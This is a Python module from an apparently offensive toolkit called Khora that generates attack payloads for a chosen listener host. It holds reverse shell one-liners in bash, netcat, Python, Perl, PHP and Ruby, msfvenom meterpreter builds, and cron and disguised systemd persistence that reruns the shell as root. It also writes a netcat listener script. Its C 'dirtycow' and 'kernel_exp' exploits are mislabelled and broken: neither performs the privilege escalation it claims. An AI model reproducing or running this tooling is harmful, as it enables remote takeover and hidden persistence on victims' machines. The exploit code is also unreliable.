# modules/backdoor_module.py
"""
Backdoor Module - Reverse Shell Generation & Payload Creation
Generates multiple reverse shell types and persistence mechanisms
"""

import subprocess
import os
import sys
import logging

logger = logging.getLogger("Khora.Backdoor")

# Reverse shell payloads
REVERSE_SHELLS = {
    'bash': 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
    'bash_nc': 'bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"',
    'nc': 'nc -e /bin/bash {lhost} {lport}',
    'nc_alt': 'nc -e /bin/sh {lhost} {lport}',
    'python': 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'{lhost}\',{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/bash\',\'-i\']);"',
    'python3': 'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'{lhost}\',{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/bash\',\'-i\']);"',
    'perl': 'perl -e \'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i")};\'',
    'php': 'php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/bash -i <&3 >&3 2>&3");\'',
    'ruby': 'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("{lhost}",{lport});while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end\'',
}

# C Exploits
EXPLOITS_C = {
    'dirtycow': '''#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <string.h>

char *mmap_addr;
int mmap_size;

void *writer() {{
    int f = open("/etc/passwd", O_WRONLY);
    char buf[] = "root:x:0:0:root:/root:/bin/bash\\n{payload}\\n";
    int c = mmap_size;
    ssize_t l = 0;
    while (c > 0) {{
        if (l + mmap_size > mmap_size) mmap_size *= 2;
        l = write(f, buf + l, mmap_size - l);
        c -= l;
    }}
    close(f);
    return NULL;
}}

int main() {{
    FILE *f = fopen("/etc/passwd", "r");
    struct stat st;
    fstat(fileno(f), &st);
    mmap_size = st.st_size;
    
    mmap_addr = mmap(NULL, mmap_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fileno(f), 0);
    
    pthread_t t;
    pthread_create(&t, NULL, writer, NULL);
    pthread_join(t, NULL);
    
    printf("[+] CoW exploit executed\\n");
    return 0;
}}''',
    
    'kernel_exp': '''#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>

int main() {{
    printf("[+] Kernel exploit POC\\n");
    if (getuid() == 0) {{
        printf("[+] Root shell spawned\\n");
        system("/bin/bash -i");
    }} else {{
        printf("[-] Privilege escalation failed\\n");
    }}
    return 0;
}}''',
}

# Persistence scripts
PERSISTENCE = {
    'cron_linux': '''#!/bin/bash
# Add reverse shell to crontab
(crontab -l 2>/dev/null; echo "* * * * * {shell}") | crontab -
''',
    
    'systemd_service': '''[Unit]
Description=System Activity Monitor
After=network.target

[Service]
Type=simple
User=root
ExecStart={shell}
Restart=always

[Install]
WantedBy=multi-user.target
''',
}

def generate_reverse_shells(lhost, lport):
    """Generate all reverse shell variants"""
    os.makedirs("payloads", exist_ok=True)
    
    shells_file = "payloads/reverse_shells.txt"
    with open(shells_file, 'w') as f:
        f.write(f"{'='*60}\n")
        f.write(f"Reverse Shell Payloads - {lhost}:{lport}\n")
        f.write(f"{'='*60}\n\n")
        
        for shell_type, payload in REVERSE_SHELLS.items():
            rendered = payload.format(lhost=lhost, lport=lport)
            f.write(f"[{shell_type.upper()}]\n")
            f.write(f"Command: {rendered}\n")
            f.write(f"Usage: copy & execute on target\n\n")
    
    logger.info(f"Reverse shells saved: {shells_file}")
    
    # Display all payloads
    print("\n" + "="*70)
    print("AVAILABLE REVERSE SHELLS".center(70))
    print("="*70)
    for shell_type, payload in REVERSE_SHELLS.items():
        rendered = payload.format(lhost=lhost, lport=lport)
        print(f"\n[{shell_type.upper()}]")
        print(f"  {rendered[:80]}...")
    print("\n" + "="*70 + "\n")

def generate_msfvenom_payloads(lhost, lport):
    """Generate Metasploit payloads using msfvenom"""
    os.makedirs("payloads", exist_ok=True)
    
    payloads = [
        ("linux/x64/meterpreter/reverse_tcp", "elf", "linux_x64_meter.elf"),
        ("linux/x86/meterpreter/reverse_tcp", "elf", "linux_x86_meter.elf"),
        ("windows/x64/meterpreter/reverse_tcp", "exe", "win_x64_meter.exe"),
        ("windows/x86/meterpreter/reverse_tcp", "exe", "win_x86_meter.exe"),
        ("cmd/unix/reverse_bash", "raw", "reverse_bash.sh"),
    ]
    
    for payload_type, format_type, output_file in payloads:
        try:
            cmd = [
                "msfvenom", "-p", payload_type,
                f"LHOST={lhost}", f"LPORT={lport}",
                "-f", format_type,
                "-o", f"payloads/{output_file}"
            ]
            print(f"[+] Generating {output_file}...")
            subprocess.run(cmd, check=True, capture_output=True)
            logger.info(f"Generated: payloads/{output_file}")
        except FileNotFoundError:
            logger.warning("[!] msfvenom not found - install metasploit-framework")
        except subprocess.CalledProcessError as e:
            logger.warning(f"[!] msfvenom failed: {e}")

def compile_c_exploits():
    """Compile C-based privilege escalation exploits"""
    os.makedirs("exploits", exist_ok=True)
    
    for exploit_name, exploit_code in EXPLOITS_C.items():
        c_file = f"exploits/{exploit_name}.c"
        bin_file = f"exploits/{exploit_name}"
        
        try:
            with open(c_file, 'w') as f:
                f.write(exploit_code)
            
            print(f"[+] Compiling {exploit_name}...")
            subprocess.run(
                ["gcc", c_file, "-o", bin_file, "-pthread"],
                check=True,
                capture_output=True
            )
            
            # Make executable
            os.chmod(bin_file, 0o755)
            logger.info(f"Compiled: {bin_file}")
            print(f"[+] {bin_file} ready")
            
        except FileNotFoundError:
            logger.warning("[!] gcc not found - install build-essential")
        except subprocess.CalledProcessError as e:
            logger.error(f"Compilation failed: {e}")

def create_persistence_scripts(lhost, lport):
    """Create persistence mechanism scripts"""
    os.makedirs("payloads/persistence", exist_ok=True)
    
    bash_shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    
    for persist_type, persist_script in PERSISTENCE.items():
        persist_file = f"payloads/persistence/{persist_type}.sh"
        
        rendered = persist_script.format(shell=bash_shell)
        with open(persist_file, 'w') as f:
            f.write(rendered)
        
        os.chmod(persist_file, 0o755)
        logger.info(f"Created: {persist_file}")
        print(f"[+] Persistence script: {persist_file}")

def generate_listener_script(lhost, lport):
    """Generate listener setup instructions"""
    listener_file = "payloads/listener_setup.sh"
    
    listener_content = f'''#!/bin/bash
# Khora Listener Setup Script

echo "[*] Starting netcat listener..."
echo "[*] Command: nc -lvnp {lport}"
echo ""
echo "Listening on all interfaces, port {lport}"
echo "Waiting for incoming connection..."
echo ""

nc -lvnp {lport}
'''
    
    with open(listener_file, 'w') as f:
        f.write(listener_content)
    
    os.chmod(listener_file, 0o755)
    logger.info(f"Listener setup: {listener_file}")
    
    # Also create one-liner instructions
    instructions = f'''
╔════════════════════════════════════════════════════════╗
║           LISTENER SETUP INSTRUCTIONS                  ║
╚════════════════════════════════════════════════════════╝

[NETCAT LISTENER]
  nc -lvnp {lport}

[BASH REVERSE SHELL]
  bash -i >& /dev/tcp/{lhost}/{lport} 0>&1

[PYTHON LISTENER]
  python3 -m http.server {lport}

[METASPLOIT HANDLER]
  use exploit/multi/handler
  set LHOST {lhost}
  set LPORT {lport}
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  run

[ONE-LINER SETUP]
  bash payloads/listener_setup.sh
'''
    
    print(instructions)

def run(target, lhost, lport=4444):
    """Main backdoor module entrypoint"""
    print(f"\n{'='*70}")
    print("BACKDOOR MODULE - Payload Generation".center(70))
    print('='*70)
    print(f"Target: {target}")
    print(f"Listener: {lhost}:{lport}\n")
    
    # Generate all payloads
    logger.info(f"Generating backdoor payloads for {lhost}:{lport}")
    
    # 1. Reverse shells
    print("\n[*] Generating reverse shells...")
    generate_reverse_shells(lhost, lport)
    
    # 2. MSFVenom payloads
    print("\n[*] Generating msfvenom payloads...")
    generate_msfvenom_payloads(lhost, lport)
    
    # 3. C exploits
    print("\n[*] Compiling C exploits...")
    compile_c_exploits()
    
    # 4. Persistence
    print("\n[*] Creating persistence scripts...")
    create_persistence_scripts(lhost, lport)
    
    # 5. Listener setup
    print("\n[*] Generating listener instructions...")
    generate_listener_script(lhost, lport)
    
    print("\n" + "="*70)
    print("PAYLOADS READY".center(70))
    print("="*70)
    print(f"All payloads in: {os.path.abspath('payloads/')}")
    print(f"Exploits in:     {os.path.abspath('exploits/')}")
    print(f"\nStart listener: nc -lvnp {lport}")
    print("="*70 + "\n")
    
    logger.info("Backdoor module completed")
